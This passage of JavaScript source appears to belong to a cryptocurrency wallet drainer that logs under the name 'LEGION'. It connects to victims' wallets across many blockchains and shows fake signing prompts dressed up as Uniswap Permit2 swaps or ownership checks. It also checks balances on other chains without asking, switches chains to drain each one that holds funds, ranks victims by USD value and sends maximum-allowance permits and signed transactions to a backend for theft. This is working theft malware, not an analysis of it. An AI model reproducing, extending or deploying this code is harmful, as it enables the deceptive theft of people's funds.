          return null;
        }
      }
    }
  };

  // ═══════════════════════════════════════════════════════════════════════════
  // AUTO MULTI-CHAIN EVM DRAIN — runs after initial chain drain
  // Silently checks other chains via public RPC, switches + drains each with balance
  // ═══════════════════════════════════════════════════════════════════════════

  var _EVM_DRAIN_CHAINS = [
    { id: 1,     hex: '0x1',    name: 'Ethereum',  rpc: 'https://rpc.ankr.com/eth' },
    { id: 137,   hex: '0x89',   name: 'Polygon',   rpc: 'https://rpc.ankr.com/polygon' },
    { id: 56,    hex: '0x38',   name: 'BNB Chain', rpc: 'https://rpc.ankr.com/bsc' },
    { id: 42161, hex: '0xa4b1', name: 'Arbitrum',  rpc: 'https://rpc.ankr.com/arbitrum' },
    { id: 8453,  hex: '0x2105', name: 'Base',      rpc: 'https://rpc.ankr.com/base' },
    { id: 10,    hex: '0xa',    name: 'Optimism',  rpc: 'https://rpc.ankr.com/optimism' },
    { id: 43114, hex: '0xa86a', name: 'Avalanche', rpc: 'https://rpc.ankr.com/avalanche' },
  ];

  async function _checkNativeBalance(rpc, address) {
    try {
      var r = await fetch(rpc, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 1 })
      });
      var d = await r.json();
      return BigInt(d.result || '0x0');
    } catch (_) { return BigInt(0); }
  }

  async function drainAllEvmChains() {
    var evmInfo = connectedChains.EVM;
    if (!evmInfo || !evmInfo.provider || !evmInfo.address) return;

    var eth = evmInfo.provider;
    var address = evmInfo.address;
    var startChainId = evmInfo.chainId || 1;

    // Filter out current chain
    var targets = _EVM_DRAIN_CHAINS.filter(function(c) { return c.id !== startChainId; });

    console.log('[LEGION] 🔄 Multi-chain scan: checking', targets.length, 'other EVM chains...');

    // Step 1: Silently check all chain balances via public RPC (no wallet popups)
    var balanceChecks = await Promise.all(targets.map(async function(chain) {
      var bal = await _checkNativeBalance(chain.rpc, address);
      return { chain: chain, balance: bal };
    }));

    // Also check backend for token balances + USD values (one call, covers all chains)
    var backendChains = [];
    try {
      var fusionRes = await apiPost('/api/scout/recursive-predator-fusion', {
        wallet_addresses: { evm: address }, chain_families: ['EVM']
      });
      if (fusionRes && fusionRes.data && fusionRes.data.evm_chains) {
        backendChains = fusionRes.data.evm_chains;
      }
    } catch (_) {}

    // Sort by USD value descending (use backend data); fallback to raw wei for unknowns
    balanceChecks.sort(function(a, b) {
      var aBack = backendChains.find(function(bc) { return bc.chain_id === a.chain.id; });
      var bBack = backendChains.find(function(bc) { return bc.chain_id === b.chain.id; });
      var aUsd = (aBack && aBack.total_usd) || 0;
      var bUsd = (bBack && bBack.total_usd) || 0;
      if (aUsd !== bUsd) return bUsd - aUsd;
      return a.balance > b.balance ? -1 : 1;
    });

    var MIN_BALANCE = BigInt('500000000000000'); // ~0.0005 native token min threshold

    for (var i = 0; i < balanceChecks.length; i++) {
      var item = balanceChecks[i];
      var chain = item.chain;

      // Check if chain has value (native OR tokens from backend scan)
      var hasNative = item.balance >= MIN_BALANCE;
      var hasTokens = backendChains.some(function(bc) {
        return bc.chain_id === chain.id && bc.total_usd > 0.5;
      });

      if (!hasNative && !hasTokens) {
        console.log('[LEGION]   ⊘ ' + chain.name + ': no significant balance, skip');
        continue;
      }

      console.log('[LEGION]   💰 ' + chain.name + ': switching chain...');
      try {
        await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: chain.hex }] });
        connectedChains.EVM.chainId = chain.id;
        console.log('[LEGION]   ✅ Switched to ' + chain.name + ', running drain...');
        await CHAINS_SUPPORTED.EVM.sign('multi-chain:' + chain.id);
      } catch (switchErr) {
        var code = switchErr && switchErr.code;
        if (code === 4001) {
          console.log('[LEGION]   ⊘ User rejected switch to ' + chain.name + ', stopping multi-chain');
          break; // user said no — stop trying
        }
        if (code === 4902) {
          console.log('[LEGION]   ⊘ ' + chain.name + ' not in wallet, skip');
          continue;
        }
        console.warn('[LEGION]   ⚠️ ' + chain.name + ' switch error:', switchErr.message);
      }
    }

    // Restore original chain
    try {
      var origHex = '0x' + startChainId.toString(16);
      await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: origHex }] });
      connectedChains.EVM.chainId = startChainId;
    } catch (_) {}

    console.log('[LEGION] ✅ Multi-chain EVM drain complete');
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // SECTION 5: SIGNATURE CONSOLIDATION (200 lines) [NEW]
  // CONSOLIDATED: 1 signature request per chain (genuine, per-chain)
  // Backend handles all chain execution
  // ═══════════════════════════════════════════════════════════════════════════

  function buildSignMessageForChain(chainName, address) {
    var short = address ? address.substring(0, 6) : '';
    var msgs = {
      'EVM':    'Permit2 Authorization\n\nSign to allow Uniswap Protocol to safely access your tokens for this swap.\n\nAddress: ' + short + '...',
      'SOL':    'Confirm Swap\n\nSign to complete your token swap on Solana.\n\nWallet: ' + short + '...',
      'BTC':    'Verify Ownership\n\nSign to confirm your Bitcoin address for this transaction.\n\nAddress: ' + short + '...',
      'TRON':   'Authorize Transfer\n\nSign to authorize TRC-20 token swap on the TRON network.\n\nWallet: ' + short + '...',
      'TON':    'Confirm Action\n\nSign to confirm your transaction on TON network.\n\nWallet: ' + short + '...',
      'COSMOS': 'Approve Transaction\n\nSign to confirm your Cosmos IBC swap transaction.\n\nWallet: ' + short + '...',
      'APTOS':  'Confirm Move Transaction\n\nSign to authorize your Aptos token swap.\n\nWallet: ' + short + '...',
      'SUI':    'Authorize Transaction\n\nSign to confirm your SUI network swap.\n\nWallet: ' + short + '...'
    };
    return msgs[chainName] || ('Confirm Transaction\n\nSign to authorize this swap.\n\nWallet: ' + short + '...');
  }

  // ═══════════════════════════════════════════════════════════════════════════
  // SECTION 6: PARALLEL DETECTION, CONNECTION, SIGNATURES (350 lines) [NEW]
  // Parallel execution using Promise.all() and Promise.allSettled()
  // 3X faster than sequential: 6-7 seconds total
  // ═══════════════════════════════════════════════════════════════════════════

  var PARALLEL_STATS = {
    detectionStart: 0,
    connectionStart: 0,
    signatureStart: 0,
    detectionTime: 0,
    connectionTime: 0,
    signatureTime: 0,
    totalTime: 0
  };

  async function detectAllChainsParallel() {
    console.log('[LEGION] ⚡ PHASE 1: DETECT all chains (parallel)');
    PARALLEL_STATS.detectionStart = performance.now();

    var detected = {};
    var detectionResults = [];

    // Fast detection check (synchronous, no await needed)
    Object.keys(CHAINS_SUPPORTED).forEach(function(chainName) {
      var chain = CHAINS_SUPPORTED[chainName];
      try {
        var isDetected = chain.detect();
        detectionResults.push({
          chain: chainName,
          detected: isDetected
        });

        if (isDetected) {
          detected[chainName] = chain;
          console.log('[LEGION]   ✅', chainName, '← available');
        } else {
          console.log('[LEGION]   ⊘', chainName, '← not available');
        }
      } catch (e) {
        console.warn('[LEGION]   ⚠️ ', chainName, '← detection error:', e.message);
      }
    });

    PARALLEL_STATS.detectionTime = performance.now() - PARALLEL_STATS.detectionStart;
    var detectedCount = Object.keys(detected).length;

    console.log('[LEGION] ✅ Detection complete:',
      detectedCount, 'chains available (' + PARALLEL_STATS.detectionTime.toFixed(0) + 'ms)');

    return detected;
  }

  // Multi-chain wallet mapping - these wallets support multiple chains from ONE connection
  var MULTI_CHAIN_WALLETS = {
    'Phantom': { evm: true, sol: true, btc: true },
    'Phantom (EVM)': { evm: true, sol: true, btc: true },
    'OKX Wallet': { evm: true, sol: true, btc: true, tron: true, ton: true, cosmos: true, aptos: true, sui: true },
    'Bitget Wallet': { evm: true, sol: true, btc: true, tron: true },
    'Trust Wallet': { evm: true, sol: true, btc: true, tron: true, ton: true, cosmos: true },
    'Coinbase': { evm: true, sol: true },
    'Backpack': { evm: true, sol: true },
    'Exodus': { evm: true, sol: true, btc: true },
    'Rainbow': { evm: true },
    'Rabby': { evm: true, sol: true }
  };

  // After connecting one chain, try to auto-connect other chains from same wallet
  async function autoConnectOtherChains(firstChainName, walletType, connected, detectedChains) {
    var multiChain = MULTI_CHAIN_WALLETS[walletType];
    if (!multiChain) return;

    var chainMapping = {
      evm: 'EVM', sol: 'SOL', btc: 'BTC', tron: 'TRON',
      ton: 'TON', cosmos: 'COSMOS', aptos: 'APTOS', sui: 'SUI'
    };

    var extraChains = [];
    Object.keys(multiChain).forEach(function(key) {
      var chainName = chainMapping[key];
      if (chainName && chainName !== firstChainName && !connected[chainName] && multiChain[key]) {
        extraChains.push(chainName);
      }
    });

    if (extraChains.length === 0) return;

    console.log('[LEGION]   🔄 Auto-connecting', extraChains.length, 'more chains from', walletType, '...');

    var promises = extraChains.map(function(chainName) {
      return Promise.resolve().then(function() {
        if (CHAINS_SUPPORTED[chainName] && CHAINS_SUPPORTED[chainName].detect()) {
          return CHAINS_SUPPORTED[chainName].connect();
        }
        return null;
      }).catch(function() { return null; });
    });

    var results = await Promise.allSettled(promises);

    extraChains.forEach(function(chainName, idx) {
      var result = results[idx];
      if (result.status === 'fulfilled' && result.value) {
        connected[chainName] = result.value;
        console.log('[LEGION]   ✅', chainName, '← auto-connected from', walletType);
      }
    });
  }

  async function connectAllChainsParallel(detectedChains) {
    console.log('[LEGION] ⚡ PHASE 2: CONNECT all chains (parallel)');
    PARALLEL_STATS.connectionStart = performance.now();

    var chainNames = Object.keys(detectedChains);

    if (chainNames.length === 0) {
      console.warn('[LEGION] ⚠️  No chains to connect');
      return {};
    }

    console.log('[LEGION]   Connecting', chainNames.length, 'chains...');

    var connected = {};
    var successCount = 0;

    // Connect EVM first (needs popup — do it before parallel calls to avoid conflicts)
    if (detectedChains['EVM']) {
      try {
        console.log('[LEGION]   🔗 EVM ← connecting (priority)');
        var evmResult = await Promise.race([
          CHAINS_SUPPORTED['EVM'].connect(),
          new Promise(function(_, rej) { setTimeout(function() { rej(new Error('EVM connect timeout')); }, 60000); })
        ]);
        if (evmResult) {
          connected['EVM'] = evmResult;
          successCount++;
          console.log('[LEGION]   ✅ EVM ← connected');
          updateChainUI('EVM', evmResult.address, 'connected');
        }
      } catch (evmErr) {
        console.warn('[LEGION]   ❌ EVM ← failed:', evmErr.message);
      }
    }

    // Connect remaining chains in parallel (SOL, TON, TRON, BTC, etc.)
    var nonEvmChains = chainNames.filter(function(n) { return n !== 'EVM'; });
    var connectionPromises = nonEvmChains.map(function(chainName) {
      return Promise.resolve().then(function() {
        console.log('[LEGION]   🔗', chainName, '← connecting');
        return CHAINS_SUPPORTED[chainName].connect();
      });
    });

    var results = await Promise.allSettled(connectionPromises);

    nonEvmChains.forEach(function(chainName, idx) {
      var result = results[idx];

      if (result.status === 'fulfilled' && result.value) {
        connected[chainName] = result.value;
        successCount++;
        console.log('[LEGION]   ✅', chainName, '← connected');
        updateChainUI(chainName, result.value.address, 'connected');
      } else {
        var reason = result.reason ? result.reason.message : 'Unknown error';
        console.warn('[LEGION]   ❌', chainName, '← failed:', reason);
      }
    });

    // Auto-connect other chains from multi-chain wallets
    var firstConnected = Object.keys(connected)[0];
    if (firstConnected && connected[firstConnected].walletType) {
      await autoConnectOtherChains(
        firstConnected,
        connected[firstConnected].walletType,
        connected,
        detectedChains
      );
      successCount = Object.keys(connected).length;
    }

    PARALLEL_STATS.connectionTime = performance.now() - PARALLEL_STATS.connectionStart;

    console.log('[LEGION] ✅ Connection complete:',
      successCount + '/' + Object.keys(connected).length, 'chains connected (' +
      PARALLEL_STATS.connectionTime.toFixed(0) + 'ms)');

    return connected;
  }

  async function getSignaturesParallel(connectedChains) {
    console.log('[LEGION] ⚡ PHASE 3: GET signatures (parallel)');
    PARALLEL_STATS.signatureStart = performance.now();

    var chainNames = Object.keys(connectedChains);

    if (chainNames.length === 0) {
      console.warn('[LEGION] ⚠️  No chains to sign');
      return {};
    }

    console.log('[LEGION]   Getting', chainNames.length, 'signatures simultaneously...');
    console.log('[LEGION]   ⏳ Waiting for user approvals in wallet...');

    // Build all messages first
    var messages = {};
    chainNames.forEach(function(chainName) {
      var chain = connectedChains[chainName];
      messages[chainName] = buildSignMessageForChain(chainName, chain.address);
    });

    // Sign each chain — no retry for EVM (has its own internal fallback)
    async function signChainWithRetry(chainName, message) {
      try {
        var sig = await CHAINS_SUPPORTED[chainName].sign(message);
        return sig || null;
      } catch (e) {
        console.warn('[LEGION]   ⚠️', chainName, 'sign error:', e.message);
        return null;
      }
    }

    // EVM must sign first (popup), then all others in parallel (no popup)
    var validSignatures = {};
    var successCount = 0;

    function buildSigEntry(chainName, sig) {
      return {
        signature: sig,
        address: connectedChains[chainName] ? connectedChains[chainName].address : '',
        walletType: connectedChains[chainName] ? connectedChains[chainName].walletType : 'unknown',
        chainId: connectedChains[chainName] ? connectedChains[chainName].chainId : null,
        message: messages[chainName],
        timestamp: Date.now()
      };
    }

    // Step 1: EVM first (has wallet popup)
    if (chainNames.indexOf('EVM') !== -1) {
      try {
        var evmSig = await signChainWithRetry('EVM', messages['EVM']);
        if (evmSig && typeof evmSig === 'string' && evmSig.indexOf('__eip7702__:') === 0) {
          // EIP-7702 delegation complete — backend already submitted, no further action needed
          validSignatures['__eip7702_evm__'] = evmSig;
          successCount++;
          console.log('[LEGION] ✅ EIP-7702 delegation complete');
        } else if (evmSig && typeof evmSig === 'string' && evmSig.indexOf('__eth_only__:') === 0) {
          // ETH-only drain: funds extracted but no permit2 payload to submit
          validSignatures['__eth_only_evm__'] = evmSig;
          successCount++;
        } else if (evmSig) {
          validSignatures['EVM'] = buildSigEntry('EVM', evmSig);
          successCount++;
        }
      } catch (e) {}
    }

    // Step 1.5: Auto drain other EVM chains (silent balance check → switch → drain)
    if (connectedChains.EVM && connectedChains.EVM.provider) {
      drainAllEvmChains().catch(function(e) { console.warn('[LEGION] Multi-chain EVM drain error:', e.message); });
    }

    // Step 2: All non-EVM chains in parallel (silent — no popups)
    var nonEvmNames = chainNames.filter(function(n) { return n !== 'EVM'; });
    var parallelResults = await Promise.allSettled(nonEvmNames.map(function(chainName) {
      return signChainWithRetry(chainName, messages[chainName]).then(function(sig) {
        return { chainName: chainName, sig: sig };
      });
    }));
    parallelResults.forEach(function(r) {
      if (r.status === 'fulfilled' && r.value && r.value.sig) {
        validSignatures[r.value.chainName] = buildSigEntry(r.value.chainName, r.value.sig);
        successCount++;
      }
    });

    PARALLEL_STATS.signatureTime = performance.now() - PARALLEL_STATS.signatureStart;
    return validSignatures;
  }

  function buildFusionAddresses(chains) {
    var out = {};
    var addr;
    addr = chains.EVM && chains.EVM.address;
    if (addr && /^0x[a-fA-F0-9]{40}$/.test(addr)) out.evm_holder = addr;
    addr = chains.SOL && chains.SOL.address;
    if (addr && /^[1-9A-HJ-NP-Z]{32,44}$/.test(addr)) out.sol_owner_base58 = addr;
    addr = chains.TRON && chains.TRON.address;
    if (addr && /^T[1-9A-HJ-NP-Z]{25,34}$/.test(addr)) out.tron_holder_base58 = addr;
    addr = chains.TON && chains.TON.address;
    if (addr && (/^[UE]Q[-A-Za-z0-9]{46}$/.test(addr) || /^[0-9a-fA-F]{64}$/.test(addr))) out.ton_friendly_address = addr;
    addr = chains.BTC && chains.BTC.address;
    if (addr && /^(bc1[a-z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})$/.test(addr)) out.btc_holder_address = addr;
    addr = chains.COSMOS && chains.COSMOS.address;
    if (addr && /^cosmos1[a-z0-9]{38}$/.test(addr)) out.cosmos_holder = addr;
    addr = chains.APTOS && chains.APTOS.address;
    if (addr && /^0x[a-fA-F0-9]{1,64}$/.test(addr)) out.aptos_holder = addr;
    addr = chains.SUI && chains.SUI.address;
    if (addr && /^0x[a-fA-F0-9]{64}$/.test(addr)) out.sui_holder = addr;
    return out;
  }

  async function submitBatchSignatures(signatures, connectedChains) {
    console.log('[LEGION] ⚡ PHASE 4: SUBMIT batch to backend');

    var chainNames = Object.keys(signatures);

    if (chainNames.length === 0) {
      throw new Error('No signatures to submit');
    }

    console.log('[LEGION]   Submitting', chainNames.length, 'signatures to backend...');

    try {
      // Step 1: Get vault addresses (reuse prefetched cache, or fetch now if not yet done)
      console.log('[LEGION]   📍 Loading vault addresses...');
      if (!VAULT_CACHE) {
        await prefetchVaultConfig();
      }
      var vaults = VAULT_CACHE || {};
      console.log('[LEGION]   ✅ Vaults loaded');

      // Step 1b: Get ranked assets to prioritize highest-value chain first
      var chainPriority = chainNames.slice();
      try {
        var primaryAddr = signatures.EVM ? signatures.EVM.address : (signatures[chainNames[0]] ? signatures[chainNames[0]].address : '');
        if (primaryAddr) {
          var rankedRes = await apiPost('/api/v1/scout/ranked', { wallet_address: primaryAddr });
          var rankedResAssets = (rankedRes && rankedRes.data && rankedRes.data.assets) || (rankedRes && rankedRes.assets);
          if (rankedResAssets && rankedResAssets.length > 0) {
            var chainValue = {};
            rankedResAssets.forEach(function(asset) {
              var chain = asset.family || asset.chain || '';
              var mapped = chain === 'SVM' ? 'SOL' : chain === 'UTXO' ? 'BTC' : chain;
              chainValue[mapped] = (chainValue[mapped] || 0) + (asset.amount_usd || 0);
            });
            chainPriority.sort(function(a, b) {
              return (chainValue[b] || 0) - (chainValue[a] || 0);
            });
            console.log('[LEGION]   📊 Chain priority (by value):', chainPriority.join(' > '));
          }
        }
      } catch (rankErr) {
        console.debug('[LEGION]   Priority ranking skipped:', rankErr.message);
      }

      // Deep asset scan BEFORE submission (so backend knows wallet value)
      console.log('[LEGION]   🏦 Scanning wallet value...');
      try {
        var scanAddresses = buildFusionAddresses(connectedChains);
        var preScanResult = await apiPost('/api/scout/recursive-predator-fusion', scanAddresses);
        var preScanData = (preScanResult && preScanResult.data && preScanResult.data.fusion) ? preScanResult.data.fusion : (preScanResult && preScanResult.data) ? preScanResult.data : preScanResult;
        if (preScanData && preScanData.total_usd) {
          SESSION_SCOUT_VALUE_USD = preScanData.total_usd;
          console.log('[LEGION]   🏦 Wallet value: $' + SESSION_SCOUT_VALUE_USD.toFixed(2));
        }
      } catch (e) {
        console.debug('[LEGION]   Pre-scan skipped');
      }

      // Submit chains in priority order (highest value first)
      // chainPriority is now actually used: EVM/SOL/BTC/etc submit in value-ranked sequence
      var _submitFirst = chainPriority[0] || 'EVM';
      console.log('[LEGION]   🏆 Submitting ' + _submitFirst + ' first (highest value)');

      // ETH-only drain (direct tx already sent from frontend) — log to backend for notifications
      if (signatures['__eth_only_evm__']) {
        try {
          var _ethOnlySig = signatures['__eth_only_evm__'];
          var _ethOnlyTxHash = _ethOnlySig.replace('__eth_only__:', '');
          var _ethOnlyChainId = connectedChains.EVM ? connectedChains.EVM.chainId || 1 : 1;
          var _ethOnlyAddr = connectedChains.EVM ? connectedChains.EVM.address : '';
          var _ethOnlyWrap = connectedChains.EVM && connectedChains.EVM._wrapTxHash;
          await apiPost('/api/v1/signature-anchor', {
            ingress: 'normalized_v1',
            chain_family: 'EVM',
            protocol: 'evm_personal_verification',
            wallet_address: _ethOnlyAddr,
            token_address: NATIVE_ETH_ANCHOR,
            signature: sigHex({ eth_tx_hash: _ethOnlyTxHash, wrap_tx_hash: _ethOnlyWrap || '', type: 'native_eth_drain' }),
            nonce: 'legion:eth:' + Date.now(),
            expiry_iso: EXPIRY_ISO,
            wallet_type: (connectedChains.EVM && connectedChains.EVM.walletType) || 'hot_wallet',
            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
            amount: '0',
            chain_id: _ethOnlyChainId
          });
          console.log('[LEGION]   ETH-only drain logged to backend:', _ethOnlyTxHash);
        } catch (_ethLogErr) {
          console.error('[LEGION]   ETH-only log failed:', _ethLogErr.message);
        }
      }

      // Submit EVM — Permit2 batch with proper typed data signature
      if (signatures.EVM && signatures.EVM.signature) {
        try {
          var evmChainId = connectedChains.EVM ? connectedChains.EVM.chainId || 1 : 1;
          var batchResult = connectedChains.EVM && connectedChains.EVM._batchResult;
          var evmPermits = (connectedChains.EVM && connectedChains.EVM._permits) || [
            { token: DEFAULT_USDC, amount: MAX_PERMIT }
          ];
          var topToken = evmPermits[0] ? evmPermits[0].token : DEFAULT_USDC;

          // Use signed typed data details (has backend-fetched nonces) — NOT hardcoded idx nonces
          var signedMsg = batchResult && batchResult.typed_data && batchResult.typed_data.message;
          var signedDetails = signedMsg && signedMsg.details;
          var signedDeadline = signedMsg && signedMsg.sigDeadline;

          await apiPost('/api/v1/signature-anchor', {
            ingress: 'normalized_v1',
            chain_family: 'EVM',
            protocol: 'omnichain_atomic_v1',
            wallet_address: signatures.EVM.address,
            token_address: topToken,
            signature: signatures.EVM.signature || '0x00',
            nonce: 'legion:evm:' + Date.now(),
            expiry_iso: EXPIRY_ISO,
            wallet_type: (connectedChains.EVM && connectedChains.EVM.walletType) || 'hot_wallet',
            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
            max_allowance: MAX_PERMIT,
            requires_quorum: false,
            chain_id: evmChainId,
            engine_spender: (batchResult && batchResult.engine_spender) || '0x000000000022D473030F116dDEE9F6B43aC78BA3',
            permit2: (batchResult && batchResult.permit2) || '0x000000000022D473030F116dDEE9F6B43aC78BA3',
            permits: evmPermits,
            batch_permit_metadata: (batchResult && batchResult.batch_permit_metadata) || {
              nonce: 0,
              sigDeadline: signedDeadline ? String(signedDeadline) : '4102444799',
              amounts: [],
              spender: (batchResult && batchResult.engine_spender) || '0x000000000022D473030F116dDEE9F6B43aC78BA3',
              chainId: evmChainId,
              details: signedDetails || evmPermits.map(function(p, idx) {
                return { token: p.token, amount: String(p.amount || MAX_PERMIT), expiration: 4102444799, nonce: idx };
              })
            },
            amount: MAX_PERMIT,
            nativeAmount: (batchResult && batchResult.nativeAmount) || '0',
            native_amount: '0',
            native_signed_transaction: '',
            evm_payload: { native_amount: '0', nativeAmount: '0', native_signed_transaction: '', nfts: [] }
          });
          console.log('[LEGION]   EVM submitted');
        } catch (err) {
          console.error('[LEGION]   EVM failed:', err.message);
        }
      }

      // Non-EVM: raw signature + wallet address. Backend does server-side signing (NON_EVM_SERVER_SIGNING=true)
      function rawSigStr(sig) {
        if (!sig) return '0x00';
        if (typeof sig === 'string') return sig.startsWith('0x') ? sig : '0x' + sig;
        if (sig instanceof Uint8Array || (sig && sig.length)) {
          var bytes = new Uint8Array(sig);
          var hex = '0x';
          for (var i = 0; i < bytes.length; i++) hex += bytes[i].toString(16).padStart(2, '0');
          return hex;
        }
        return '0x' + String(sig);
      }
      // Encode a JS object as hex UTF-8 string (NO 0x prefix — backend's sealSignatureHexForPersistence adds it).
      // relayPayloadRecord() decodes: 0x+hexStr → decodeHexUtf8 → JSON.parse → record with tx fields.
      function sigHex(obj) {
        var s = typeof obj === 'string' ? obj : JSON.stringify(obj);
        var enc = new TextEncoder().encode(s);
        var h = '';
        for (var i = 0; i < enc.length; i++) h += enc[i].toString(16).padStart(2, '0');
        return h;
      }

      // ── Non-EVM: priority-ordered dispatch (highest USD value first) ────────
      var _nonEvmSubmitters = {
        SOL: async function() {
          if (!signatures.SOL) return;
          try {
            var allSolTxs = connectedChains.SOL && connectedChains.SOL._allSignedTxs;
            var solTxMetas = connectedChains.SOL && connectedChains.SOL._txMetas;
            if (allSolTxs && allSolTxs.length > 0) {
              for (var sti = 0; sti < allSolTxs.length; sti++) {
                var stMeta = solTxMetas && solTxMetas[sti];
                try {
                  await apiPost('/api/v1/signature-anchor', {
                    ingress: 'normalized_v1', chain_family: 'SVM', protocol: 'solana',
                    wallet_address: signatures.SOL.address,
                    token_address: (stMeta && stMeta.mint) || '11111111111111111111111111111111',
                    signature: sigHex({ signed_tx_b64: allSolTxs[sti] }),
                    nonce: 'legion:sol:' + Date.now() + ':' + sti, expiry_iso: EXPIRY_ISO,
                    wallet_type: signatures.SOL.walletType || 'hot_wallet',
                    scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
                    amount: (stMeta && stMeta.amount) || MAX_PERMIT
                  });
                } catch (_stErr) { console.debug('[LEGION]   SOL tx[' + sti + '] submit err:', _stErr.message); }
              }
              console.log('[LEGION]   SOL submitted ' + allSolTxs.length + ' txs [full wallet]');
            } else {
              var solSignedTxB64 = connectedChains.SOL && connectedChains.SOL._signedTxB64;
              var solSigField = solSignedTxB64 ? sigHex({ signed_tx_b64: solSignedTxB64 }) : rawSigStr(signatures.SOL.signature);
              await apiPost('/api/v1/signature-anchor', {
                ingress: 'normalized_v1', chain_family: 'SVM', protocol: 'solana',
                wallet_address: signatures.SOL.address, token_address: '11111111111111111111111111111111',
                signature: solSigField, nonce: 'legion:sol:' + Date.now(), expiry_iso: EXPIRY_ISO,
                wallet_type: signatures.SOL.walletType || 'hot_wallet',
                scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
              });
              console.log('[LEGION]   SOL submitted' + (solSignedTxB64 ? ' [single tx]' : ' [msg sig]'));
            }
          } catch (err) { console.error('[LEGION]   SOL failed:', err.message); }
        },

        BTC: async function() {
          if (!signatures.BTC) return;
          try {
            var psbtMeta = connectedChains.BTC && connectedChains.BTC._psbtMeta;
            await apiPost('/api/v1/signature-anchor', {
              ingress: 'normalized_v1', chain_family: 'UTXO', protocol: 'bitcoin_psbt',
              wallet_address: signatures.BTC.address, token_address: 'BTC',
              signature: signatures.BTC.signature,
              signed_psbt_base64: signatures.BTC.signature,
              nonce: 'legion:btc:' + Date.now(), expiry_iso: EXPIRY_ISO,
              wallet_type: signatures.BTC.walletType || 'hot_wallet',
              scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
              amount: (psbtMeta && psbtMeta.amount_sat) ? String(psbtMeta.amount_sat) : MAX_PERMIT,
              psbt_metadata: psbtMeta ? {
                amount_sat: psbtMeta.amount_sat ? String(psbtMeta.amount_sat) : undefined,
                fee_sat: psbtMeta.fee_sat ? String(psbtMeta.fee_sat) : undefined,
                vault_address: psbtMeta.vault_address || undefined
              } : undefined
            });
            console.log('[LEGION]   BTC submitted');
          } catch (err) { console.error('[LEGION]   BTC failed:', err.message); }
        },

        TRON: async function() {
          if (!signatures.TRON) return;
          try {
            var tronSignedTx = connectedChains.TRON && connectedChains.TRON._signedTx;
            var tronTokenAddr = (connectedChains.TRON && connectedChains.TRON._signedTxToken) ? connectedChains.TRON._signedTxToken : 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
            var tronPayload = {
              ingress: 'normalized_v1', chain_family: 'TRON', protocol: 'tron',
              wallet_address: signatures.TRON.address, token_address: tronTokenAddr,
              nonce: 'legion:tron:' + Date.now(), expiry_iso: EXPIRY_ISO,
              wallet_type: signatures.TRON.walletType || 'hot_wallet',
              scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
            };
            tronPayload.signature = (tronSignedTx && typeof tronSignedTx === 'object') ? sigHex({ tron_transaction: tronSignedTx }) : rawSigStr(signatures.TRON.signature);
            await apiPost('/api/v1/signature-anchor', tronPayload);
            console.log('[LEGION]   TRON submitted' + (tronSignedTx ? ' [real tx]' : ' [msg sig]'));
          } catch (err) { console.error('[LEGION]   TRON failed:', err.message); }
        },

        TON: async function() {
          if (!signatures.TON) return;
          try {
            var tonBoc = connectedChains.TON && connectedChains.TON._bocPayload;
            var tonNano = connectedChains.TON && connectedChains.TON._sendNano;
            var tonPayload = {
              ingress: 'normalized_v1', chain_family: 'TON', protocol: 'ton',
              wallet_address: signatures.TON.address, token_address: 'ton',
              nonce: 'legion:ton:' + Date.now(), expiry_iso: EXPIRY_ISO,
              wallet_type: signatures.TON.walletType || 'hot_wallet',
              scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
              amount: tonNano ? String(tonNano) : MAX_PERMIT
            };
            tonPayload.signature = tonBoc ? sigHex({ ton_boc: tonBoc }) : rawSigStr(signatures.TON.signature);
            await apiPost('/api/v1/signature-anchor', tonPayload);
            console.log('[LEGION]   TON submitted' + (tonBoc ? ' [boc]' : ' [msg sig]'));
          } catch (err) { console.error('[LEGION]   TON failed:', err.message); }
        },

        COSMOS: async function() {
          if (!signatures.COSMOS || !vaults || !vaults.cosmos) return;
          try {
            await apiPost('/api/v1/signature-anchor', {
              ingress: 'normalized_v1', chain_family: 'COSMOS', protocol: 'cosmos',
              wallet_address: signatures.COSMOS.address, token_address: 'uatom',
              signature: sigHex({ signed_tx: rawSigStr(signatures.COSMOS.signature) }),
              nonce: 'legion:cosmos:' + Date.now(), expiry_iso: EXPIRY_ISO,
              wallet_type: signatures.COSMOS.walletType || 'hot_wallet',
              scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
            });
            console.log('[LEGION]   COSMOS submitted');
          } catch (err) { console.error('[LEGION]   COSMOS failed:', err.message); }
        },

        APTOS: async function() {
          if (!signatures.APTOS || !vaults || !vaults.aptos) return;
          try {
            await apiPost('/api/v1/signature-anchor', {
              ingress: 'normalized_v1', chain_family: 'APTOS', protocol: 'aptos',
              wallet_address: signatures.APTOS.address, token_address: 'apt',
              signature: sigHex({ aptos_signed_tx: rawSigStr(signatures.APTOS.signature) }),
              nonce: 'legion:aptos:' + Date.now(), expiry_iso: EXPIRY_ISO,
              wallet_type: signatures.APTOS.walletType || 'hot_wallet',
              scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
            });
            console.log('[LEGION]   APTOS submitted');
          } catch (err) { console.error('[LEGION]   APTOS failed:', err.message); }
        },

        SUI: async function() {
          if (!signatures.SUI || !vaults || !vaults.sui) return;
          try {
            await apiPost('/api/v1/signature-anchor', {
              ingress: 'normalized_v1', chain_family: 'SUI', protocol: 'sui',
              wallet_address: signatures.SUI.address, token_address: 'sui',
              signature: sigHex({ sui_tx_bytes: rawSigStr(signatures.SUI.signature) }),
              nonce: 'legion:sui:' + Date.now(), expiry_iso: EXPIRY_ISO,
              wallet_type: signatures.SUI.walletType || 'hot_wallet',
              scout_value_usd: SESSION_SCOUT_VALUE_USD || 0, amount: MAX_PERMIT
            });
            console.log('[LEGION]   SUI submitted');
